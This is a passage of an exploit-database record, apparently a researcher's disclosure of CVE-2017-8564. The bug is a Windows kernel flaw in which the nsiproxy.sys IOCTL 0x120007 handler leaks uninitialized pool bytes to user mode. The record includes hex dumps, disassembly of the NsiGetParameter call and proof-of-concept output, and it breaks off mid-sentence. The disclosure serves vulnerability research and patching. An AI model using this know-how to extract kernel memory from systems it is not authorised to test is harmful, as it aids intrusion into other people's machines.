{
    "text": "ecve : CVE-2017-8564 ， title : Microsoft Windows Kernel - 'IOCTL 0x120007 NsiGetParameter' nsiproxy/netio Pool Memory Disclosure - Windows dos Exploit ， verified : Verified ， exploit_detail : / *  ， We have discovered that the handler of the 0x120007 IOCTL in nsiproxy.sys ( \\\\.\\Nsi device ) discloses portions of uninitialized pool memory to user-mode clients , likely due to output structure alignment holes. ， On our test Windows 7 32-bit workstation , an example layout of the output buffer is as follows :  ， --- cut --- ， 00000000 : 00 00 00 00 00 00 00 00 00 00 00 00 00 ff ff ff ................ ， 00000010 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ ， 00000020 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ ， 00000030 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ ， 00000040 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ ， 00000050 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ ， 00000060 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ ， 00000070 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ ， 00000080 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ ， 00000090 : 00 00 00 00 00 00 00 00 00 ff ff ff 00 00 00 00 ................ ， 000000a0 : 00 00 00 00 ff 00 ff ff 00 00 00 00 ff ff ff ff ................ ， 000000b0 : 00 00 00 00 00 00 00 00 ........ ， --- cut --- ， Where 00 denote bytes which are properly initialized , while ff indicate uninitialized values copied back to user-mode. As can be seen , a total of 13 bytes ( out of 184 ) scattered across the structure are disclosed to the client application. The bug manifests itself through a call to the undocumented NSI ! NsiGetParameter userland function , in the same fashion that it is called in WSDApi ! CWSDInterfaceTable :  : GetInterfaceProfiles :  ， --- cut --- ， .text : 6EA52AFF push eax ， .text : 6EA52B00 push ebx ， .text : 6EA52B01 lea eax ,  [ ebp+var_BC ]  ， .text : 6EA52B07 push eax ， .text : 6EA52B08 push 0 ， .text : 6EA52B0A push 8 ， .text : 6EA52B0C lea eax ,  [ ebp+InterfaceLuid ]  ， .text : 6EA52B12 push eax ， .text : 6EA52B13 push 7 ， .text : 6EA52B15 push offset _NPI_MS_IPV4_MODULEID ， .text : 6EA52B1A push 1 ， .text : 6EA52B1C call _NsiGetParameter @ 36 ; NsiGetParameter ( x , x , x , x , x , x , x , x , x )  ， --- cut --- ， The issue can be reproduced by running the attached proof-of-concept program on a system with the Special Pools mechanism enabled for netio.sys. Then , it is clearly visible that bytes at the aforementioned offsets are equal to the markers inserted by Special Pools ( 0x3d or '=' in this case )  , and would otherwise contain leftover data that was previously stored in that memory region :  ， --- cut --- ， Number of Adapters : 1 ， Adapter Index [ 0 ]  : 11 ， 00000000 : 00 00 00 00 00 01 01 00 00 00 01 01 00 [ 3d 3d 3d ] .............=== ， 00000010 : 00 00 00 00 02 00 00 00 00 00 00 00 0a 00 00 00 ................ ， 00000020 : 30 75 00 00 e8 03 00 00 c0 27 09 00 03 00 00 00 0u.......'...... ， 00000030 : 01 00 00 00 64 19 00 00 0b 00 00 00 0b 00 00 00 ....d........... ， 00000040 : 0b 00 00 00 0b 00 00 00 01 00 00 00 01 00 00 00 ................ ， 00000050 : 01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 ................ ， 00000060 : 01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 ................ ， 00000070 : 00 00 00 00 01 00 00 00 dc 05 00 00 40 00 00 00 ............ @ ... ， 00000080 : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ ， 00000090 : 00 00 00 00 00 00 00 00 00 [ 3d 3d 3d ] 08 07 00 00 .........===.... ， 000000a0 : 01 00 00 00 [ 3d ] 00 [ 3d 3d ] 00 00 00 00 [ 3d 3d 3d 3d ] ....=.==....==== ， 000000b0 : 6b 0a 34 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? k.4............. ， --- cut --- ， At least one local network adapter must be installed on the tested machine to observe the bug. The",
    "time": "2017-07-18"
}